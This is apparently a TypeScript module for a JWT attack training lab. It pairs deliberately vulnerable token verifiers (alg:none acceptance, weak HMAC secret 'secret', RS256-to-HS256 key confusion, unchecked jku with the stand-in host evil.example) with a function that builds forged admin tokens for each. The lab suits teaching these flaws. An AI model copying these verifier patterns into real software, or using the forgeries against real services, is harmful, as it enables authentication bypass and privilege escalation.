import { createHmac, timingSafeEqual, verify as rsaVerify } from "node:crypto";
import { createServer as createHttpServer, get as httpGet } from "node:http";
import type { IncomingMessage, Server, ServerResponse } from "node:http";
import type { AttackResult, LabInput, Level, LootItem, RealLab } from "./runner.js";

/**
 * Real JWT lab: genuine RS256 (fixed public RSA-2048 lab key, node:crypto) and HS256
 * (real HMAC-SHA256, timing-safe compare) verification, a real alg:none
 * bypass, real RS256→HS256 algorithm confusion (the RSA public key's own PEM
 * bytes used as the HMAC secret), and a jku key lookup for the same attacker
 * JWKS URL/key the simulated lab uses, served by a real loopback HTTP helper
 * (127.0.0.1, ephemeral port) — no real DNS/outbound network is ever used.
 * Objective: forge a token with role=admin that the current level accepts.
 */

const KID = "key-2026";
const EVIL_KID = "evil";
/** The attacker-controlled JWKS URL (same constant as the simulated lab). */
export const ATTACKER_JKU = "https://evil.example/jwks.json";

/**
 * Fixed public lab key (RSA-2048). Only the public half exists in the source:
 * the one legitimately signed token (alice, role=user) is pre-signed below.
 */
export const RSA_PUBLIC_PEM = [
  "-----BEGIN PUBLIC KEY-----",
  "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA35B5W7e7TIIXNiguR87u",
  "hhTVS8SzHWaGz7onGWyFBXtFr087gv/OMNpoLC/JXSU3kNwmuznpATaFFCeQokiF",
  "paOtnajGB5xxfT/IL6x/GrUX5PP3eE2OkvPVwJCgvp20kXoAVaSXSkPPKFwbem1R",
  "EpRGKP2+Jf4hBN8yXoUtPEoGTORQ+aQQArunFnWNKFuhcmoDaPGu/i9i6GORZ9Qu",
  "Ur625rG9wbkgcoia39MXi56PYowUR9CjdfdjEVH0PGj/VdZ2oQWapRqZWLEsLDCr",
  "nIrT+F/efOvpZ/hDIUEsxjA8S2EU0tSkBarJSXRCHh9+UVH2UsYLQceDBi9L+Kez",
  "XwIDAQAB",
  "-----END PUBLIC KEY-----",
  "",
].join("\n");

/** RS256 signature of the benign alice/user token, made offline with the (discarded) private key. */
const BENIGN_SIGNATURE =
  "qdcm-hrZE-a5gc3BfPDYvGLhU3WrZj6bVvCGJzGeGGqpXq4HM9RhvyahCL8yskgfziC_FRsfF0iNofC9mjEi_ql_77FJbFN2PUOLsB5CVvOJ640Z5fBFGd4688bcZNqU5hoViMx0ffN3ba3I2Ok6KOVBptNuX3SrUApHobRTAXgmCtLIZSierRzaRO697a7w3pjAC0BoeBX3N6Bc3nsdHAgmHYSaLxWVO2tA0GpHVAZWdmjgJ-g036kVuByGqWkyOaph7_rkLUuV7xS7Y4sEu2me00SMV-486dn2lpy5ZpWq2dlGLPckNxvF-Sh3I4DAFp3aNTluk4TEYCiqtkY0Ug";

/** Lv2's crackable shared secret. */
const WEAK_SECRET = Buffer.from("secret", "utf8");
/** Lv3's algorithm-confusion key: the RS256 public key used verbatim as an HMAC secret. */
const CONFUSION_SECRET = Buffer.from(RSA_PUBLIC_PEM, "utf8");
/** Lv4's attacker-planted oct key, served only by the in-process JWKS helper below. */
const EVIL_HMAC_KEY = Buffer.from("evil-hmac-key", "utf8");

function b64url(buf: Buffer): string {
  return buf.toString("base64url");
}

function encodePart(value: unknown): string {
  return b64url(Buffer.from(JSON.stringify(value), "utf8"));
}

function decodePart(part: string): Record<string, unknown> | null {
  try {
    const parsed: unknown = JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
    return typeof parsed === "object" && parsed !== null ? (parsed as Record<string, unknown>) : null;
  } catch {
    return null;
  }
}

function signHS256(header: Record<string, unknown>, payload: Record<string, unknown>, secret: Buffer): string {
  const data = `${encodePart(header)}.${encodePart(payload)}`;
  const sig = createHmac("sha256", secret).update(data).digest();
  return `${data}.${b64url(sig)}`;
}

function makeNoneToken(header: Record<string, unknown>, payload: Record<string, unknown>): string {
  return `${encodePart(header)}.${encodePart(payload)}.`;
}

function verifyHmac(data: string, sig: Buffer, secret: Buffer): boolean {
  const expected = createHmac("sha256", secret).update(data).digest();
  return expected.length === sig.length && timingSafeEqual(expected, sig);
}

function verifyRsa(data: string, sig: Buffer): boolean {
  try {
    return rsaVerify("RSA-SHA256", Buffer.from(data), RSA_PUBLIC_PEM, sig);
  } catch {
    return false;
  }
}

// --- Loopback JWKS helper: models a jku endpoint without any real network. ---

interface JwksHelper {
  base: string;
}

/** Planted JWKS documents, reachable only through the loopback helper below. */
function plantedJwks(kid: string): string | null {
  if (kid !== EVIL_KID) return null;
  return JSON.stringify({ keys: [{ kty: "oct", kid: EVIL_KID, alg: "HS256", k: b64url(EVIL_HMAC_KEY) }] });
}

let jwksHelper: Promise<JwksHelper> | null = null;

function startJwksHelper(): Promise<JwksHelper> {
  return new Promise((resolve, reject) => {
    const server: Server = createHttpServer((req: IncomingMessage, res: ServerResponse) => {
      const url = new URL(req.url ?? "/", "http://127.0.0.1");
      const match = /^\/jwks\/([\w-]+)\.json$/.exec(url.pathname);
      const body = match ? plantedJwks(match[1]) : null;
      if (body === null) {
        res.writeHead(404).end();
        return;
      }
      res.writeHead(200, { "Content-Type": "application/json" }).end(body);
    });
    server.unref();
    server.on("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (address === null || typeof address === "string") {
        reject(new Error("jwks helper failed to bind"));
        return;
      }
      resolve({ base: `http://127.0.0.1:${address.port}/jwks/` });
    });
  });
}

function getJwksHelper(): Promise<JwksHelper> {
  if (!jwksHelper) jwksHelper = startJwksHelper();
  return jwksHelper;
}

interface JwksFetch {
  ok: boolean;
  raw?: string;
  keys?: { kty?: string; kid?: string; k?: string }[];
  error?: string;
}

function fetchJson(url: string): Promise<JwksFetch> {
  return new Promise((resolve) => {
    const req = httpGet(url, { timeout: 2000 }, (res) => {
      const chunks: Buffer[] = [];
      res.on("data", (c: Buffer) => chunks.push(c));
      res.on("end", () => {
        if (res.statusCode !== 200) {
          resolve({ ok: false, error: `HTTP ${res.statusCode}` });
          return;
        }
        try {
          const raw = Buffer.concat(chunks).toString("utf8");
          const parsed: unknown = JSON.parse(raw);
          const keys =
            typeof parsed === "object" && parsed !== null && Array.isArray((parsed as { keys?: unknown }).keys)
              ? ((parsed as { keys: unknown[] }).keys as { kty?: string; kid?: string; k?: string }[])
              : [];
          resolve({ ok: true, raw, keys });
        } catch {
          resolve({ ok: false, error: "invalid JSON" });
        }
      });
    });
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", (err: Error) => resolve({ ok: false, error: err.message }));
  });
}

interface JkuResolution {
  key: Buffer | null;
  line: string;
}

/**
 * In-process "DNS": the only names the lab can resolve, each mapped to a
 * document on the loopback helper. Anything else is simply unreachable, so no
 * real DNS lookup or outbound request ever happens.
 */
const JKU_RESOLVER = new Map<string, string>([[ATTACKER_JKU, EVIL_KID]]);

/**
 * Lv4's vulnerable key resolution: the jku allow-list only checks the scheme
 * (https://), so any host/path the token names is trusted — and here an
 * attacker-controlled JWKS is "reachable". The fetch itself goes to the
 * loopback helper, never to the named host.
 */
async function resolveJkuHmacKey(jku: string, kid: string | undefined): Promise<JkuResolution> {
  if (!jku.startsWith("https://")) {
    return { key: null, line: `jku fetch blocked: ${jku} は https:// ではありません` };
  }
  const doc = JKU_RESOLVER.get(jku);
  if (doc === undefined) {
    return { key: null, line: `JWKS fetch failed: ${jku}` };
  }
  const helper = await getJwksHelper();
  const res = await fetchJson(`${helper.base}${doc}.json`);
  if (!res.ok || !res.keys) {
    return { key: null, line: `JWKS fetch failed: ${jku}` };
  }
  const match = res.keys.find((k) => k.kty === "oct" && (kid === undefined || k.kid === kid)) ?? res.keys.find((k) => k.kty === "oct");
  if (!match?.k) {
    return { key: null, line: `JWKS ${jku} : ${res.raw}` };
  }
  return { key: Buffer.from(match.k, "base64url"), line: `JWKS ${jku} : ${res.raw}` };
}

function describeMechanism(level: Level, alg: string, accepted: boolean): string {
  if (level === 1) return accepted ? "alg=none → 署名検証をスキップ" : `alg=${alg || "?"}`;
  if (alg === "HS256") return "HMAC-SHA256(header.payload)";
  if (alg === "RS256") return "RSA-SHA256 verify(header.payload)";
  return `alg=${alg || "?"}`;
}

async function run(level: Level, input: LabInput): Promise<AttackResult> {
  const token = (input.token ?? "").trim();
  const [head = "", body = "", sigPart = ""] = token.split(".");
  const header = decodePart(head);
  const payload = decodePart(body);
  if (!header || !payload) {
    return {
      solved: false,
      output: ["[401] JWT の形式が不正です。"],
      note: "header.payload.signature の形式を確認してください。",
    };
  }

  const data = `${head}.${body}`;
  const sigBuf = Buffer.from(sigPart, "base64url");
  const alg = typeof header.alg === "string" ? header.alg : "";
  const kid = typeof header.kid === "string" ? header.kid : undefined;
  const isAdmin = payload.role === "admin";
  const isAliceUser = payload.sub === "alice" && payload.role === "user";

  let sigValid = false;
  let reason: string;
  let jwksLine: string | null = null;
  let foundJwks = false;
  const wellKnownLines =
    level >= 3
      ? ["GET /.well-known/jwks-public.pem", ...RSA_PUBLIC_PEM.trimEnd().split("\n")]
      : [];

  if (level === 1) {
    if (alg === "none") {
      sigValid = sigPart === "";
      reason = sigValid ? "alg をトークンから信用し、none を許可しています。" : "署名が必要です。";
    } else if (alg === "RS256") {
      sigValid = verifyRsa(data, sigBuf);
      reason = sigValid ? "有効な署名です。" : "署名が一致しません。";
    } else {
      reason = `未対応の alg です: ${alg || "(空)"}`;
    }
  } else if (level === 2) {
    if (alg === "none") {
      reason = "alg:none は拒否されました。";
    } else if (alg === "HS256") {
      sigValid = verifyHmac(data, sigBuf, WEAK_SECRET);
      reason = sigValid
        ? "署名鍵 `secret` が辞書攻撃で推測され、HMAC-SHA256 が一致しました。"
        : "HMAC が一致しません。";
    } else if (alg === "RS256") {
      sigValid = verifyRsa(data, sigBuf);
      reason = sigValid ? "有効な署名です。" : "署名が一致しません。";
    } else {
      reason = `未対応の alg です: ${alg || "(空)"}`;
    }
  } else if (level === 3) {
    if (alg === "none") {
      reason = "alg:none は拒否されました。";
    } else if (alg === "HS256") {
      sigValid = verifyHmac(data, sigBuf, CONFUSION_SECRET);
      reason = sigValid
        ? "RS256 用の公開鍵を HS256 の秘密鍵として使い、HMAC が一致しました。"
        : "HMAC が一致しません。";
    } else if (alg === "RS256") {
      sigValid = verifyRsa(data, sigBuf);
      reason = sigValid ? "有効な署名です。" : "署名が一致しません。";
    } else {
      reason = `未対応の alg です: ${alg || "(空)"}`;
    }
  } else if (level === 4) {
    if (alg === "none") {
      reason = "alg:none は拒否されました。";
    } else if (alg === "HS256") {
      if (typeof header.jku === "string") {
        const resolved = await resolveJkuHmacKey(header.jku, kid);
        jwksLine = resolved.line;
        if (resolved.key) {
          foundJwks = true;
          sigValid = verifyHmac(data, sigBuf, resolved.key);
          reason = sigValid
            ? "jku から攻撃者 JWKS の oct 鍵を取得し、その HMAC で検証しました。"
            : "取得した鍵では署名が一致しません。";
        } else {
          reason = "署名を検証できる鍵が見つかりませんでした。";
        }
      } else {
        reason = "jku がないため検証鍵を解決できません。";
      }
    } else if (alg === "RS256") {
      sigValid = kid === KID && verifyRsa(data, sigBuf);
      reason = sigValid ? "有効な署名です。" : "署名が一致しません。";
    } else {
      reason = `未対応の alg です: ${alg || "(空)"}`;
    }
  } else {
    if (typeof header.jku === "string") {
      jwksLine = `jku (${header.jku}) は無視されました。鍵は信頼済みストアの kid から選びます。`;
    }
    if (alg === "RS256" && kid === KID) {
      sigValid = verifyRsa(data, sigBuf);
    }
    reason = "固定アルゴリズム・許可済み kid・信頼済み鍵による署名検証で拒否しました。";
  }

  const accepted = sigValid && isAdmin;
  const benign = !accepted && isAliceUser && sigValid;
  const progress = !accepted && !isAliceUser && foundJwks;
  const loot: LootItem[] | undefined = foundJwks
    ? [{ id: "jwt-oct", label: "JWKS oct 鍵 (decoded)", value: EVIL_HMAC_KEY.toString("utf8") }]
    : undefined;

  const recap = accepted
    ? level === 4
      ? ["jku から攻撃者 JWKS を取った", "oct 鍵で HMAC が一致した", "role=admin で /admin が開いた"]
      : level === 3
        ? ["alg を HS256 にした", "公開鍵を HMAC 秘密として使った", "role=admin で /admin が開いた"]
        : ["トークンの alg / 鍵をすり替えられた", "サーバーが改ざんトークンを受け入れた"]
    : undefined;

  return {
    solved: accepted,
    benign,
    progress,
    output: [
      `header : ${JSON.stringify(header)}`,
      `payload: ${JSON.stringify(payload)}`,
      ...wellKnownLines,
      ...(jwksLine ? [jwksLine] : []),
      accepted
        ? `[200 OK] /admin — ${String(payload.sub)} (admin)`
        : isAliceUser && sigValid
          ? "[403 FORBIDDEN] /admin は role=admin が必要です。"
          : "[401 INVALID TOKEN]",
    ],
    note: accepted
      ? "改ざんした JWT で管理者権限を取得しました。"
      : isAliceUser && sigValid
        ? "alice のトークンとして認識しました。この API は管理者専用です。"
        : reason,
    assembled: describeMechanism(level, alg, accepted),
    recap,
    loot,
  };
}

/** Builds real tokens for each Lv1-4 exploit, plus the benign default token, for tests. */
export function buildJwtExploitTokens(): {
  benign: string;
  none: string;
  weakHmac: string;
  confusion: string;
  jku: string;
} {
  const admin = { sub: "attacker", role: "admin" };
  const user = { sub: "alice", role: "user" };
  return {
    benign: `${encodePart({ alg: "RS256", typ: "JWT", kid: KID })}.${encodePart(user)}.${BENIGN_SIGNATURE}`,
    none: makeNoneToken({ alg: "none", typ: "JWT" }, admin),
    weakHmac: signHS256({ alg: "HS256", typ: "JWT" }, admin, WEAK_SECRET),
    confusion: signHS256({ alg: "HS256", typ: "JWT" }, admin, CONFUSION_SECRET),
    jku: signHS256({ alg: "HS256", typ: "JWT", jku: ATTACKER_JKU, kid: EVIL_KID }, admin, EVIL_HMAC_KEY),
  };
}

/** Exposes the RS256 public key as an attacker realistically could (e.g. via a JWKS/certs endpoint). */
export function getRsaPublicKeyPem(): string {
  return RSA_PUBLIC_PEM;
}

export const jwtRealLab: RealLab = { id: "jwt", run };
